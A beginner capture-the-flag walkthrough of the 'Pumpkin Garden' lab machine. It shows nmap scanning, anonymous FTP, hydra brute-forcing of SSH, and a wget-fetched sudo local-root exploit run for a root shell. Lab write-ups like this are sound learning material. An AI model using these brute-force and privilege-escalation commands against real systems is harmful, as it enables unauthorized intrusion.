# Pumpkin Garden Walkthrough

"Mission-Pumpkin v1.0 is a beginner level CTF series, created by keeping beginners in mind. This CTF series is for people who have basic knowledge of hacking tools and techniques but struggling to apply known tools. I believe that machines in this series will encourage beginners to learn the concepts by solving problems. PumpkinRaising is Level 2 of series of 3 machines under Mission-Pumpkin v1.0. The Level 1 ends by accessing PumpkinGarden_Key file, this level is all about identifying 4 pumpkin seeds (4 Flags - Seed ID’s) and gain access to root and capture final Flag.txt file."


After starting the Pumpkin Garden machine, which is running on Ubuntu 14.04, you will see a screen such as the one below:
![]({{ site.baseurl }}/images/PG/PG1.png)

As usual, we are going to start with scanning the ip of our target machine with the command:

```
nmap -p- -A 10.10.0.5
```

This will give us all the information about open ports and the services running on those ports. It shows that we have ftp, ssh and http, all of which are possible attack vectors.

![]({{ site.baseurl }}/images/PG/PG2.png)

From the information the scan returns to us, you can see that there are a couple of options to go about this. We are going to start with the low hanging fruit, so that we learn as much as possible along the way. So let's try ftp login as anonymous with a blank password,

```
ftp 10.10.0.5
```

![]({{ site.baseurl }}/images/PG/PG3.png)

After we get in, we can do an ls to check what is in the current directory, and there's a note. Nice. Let's grab that note and read it. It says that "Looking for PumpkinGarden? I think jack can help you find it", that's a clue that jack is a user on this machine.

So we can try an ssh as jack, but we don't have a password. We need to generate a password list that we can use for the ssh login. We can use cewl to generate that password.

To generate the password list we are going to use CeWL. CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.

```
cewl http://10.10.0.5:1515 -w wordlist.txt
```

After generating the wordlist, then we can use hydra to bruteforce the ssh login and point us to the correct password.

```
hydra -l jack -P wordlist.txt ssh://10.10.0.5 -s 3535
```

![]({{ site.baseurl }}/images/PG/PG5.png)

And here, we find our password, so we can go ahead and login as jack.

```
ssh -p 3535 jack@10.10.0.5
```

![]({{ site.baseurl }}/images/PG/PG6.png)

And from this, we get another clue, that there is another user by the name scarecrow. We need to find the password for scarecrow.

At this point, after trying other things, I had to move and look around the site on 10.10.0.5:1515, to see if i can find any other clue.

![]({{ site.baseurl }}/images/PG/PG7.png)

From viewing the page source, we can read the message that says "Pumpkin images may help you find the way", which is good. All we have to do is go looking into pumpkin images

![]({{ site.baseurl }}/images/PG/PG8.png)

We can do a dirb to check the urls of the images folder, and then head over there. After looking around, we'll see an image titled hidden.jpg, that's interesting. and following that, we are going to find a clue, clue.txt, with a base64 string. After decoding that, we have scarecrow's password. So we can login as scarecrow now:

```
echo <base64string> | bade64 -d
ssh -p 3535 scarecrow@10.10.0.5
```

![]({{ site.baseurl }}/images/PG/PG9.png)

In there there is another note, pointing us to the root user aka LordPumpkin, and we get the password for logging in as goblin as well, that's cool.

So we are gonna go ahead and login as goblin,

```
ssh -p 3535 goblin@10.10.0.5
```
![]({{ site.baseurl }}/images/PG/PG10.png)

The final thing we have to do is run the provided exploit to get root access, that's easy enough provided the exploit is already given to us.

```
wget https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
```
After fetching the exploit, we have to make the file executable, and then run it. To understand more about the vulnerability please visit this link https://www.securityfocus.com/bid/38362/info

```
goblin@Pumpkin:~$ chmod +x 38362.sh 
goblin@Pumpkin:~$ ./38362.sh 38362.sh 
Tod Miller Sudo local root exploit
by Slouching
automated by kingcope
ALEX-ALEX
root@Pumpkin:/tmp# cd
root@Pumpkin:~# ls
PumpkinGarden_Key 
root@Pumpkin:~# cat PumpkinGarden_Key 
Q29uZ3JhdHVsYXRpb25zIQ==
root@Pumpkin:~# echo Q29uZ3JhdHVsYXRpb25zIQ== | base64 -d
Congratulations!
```

And we are done, we got the flag!





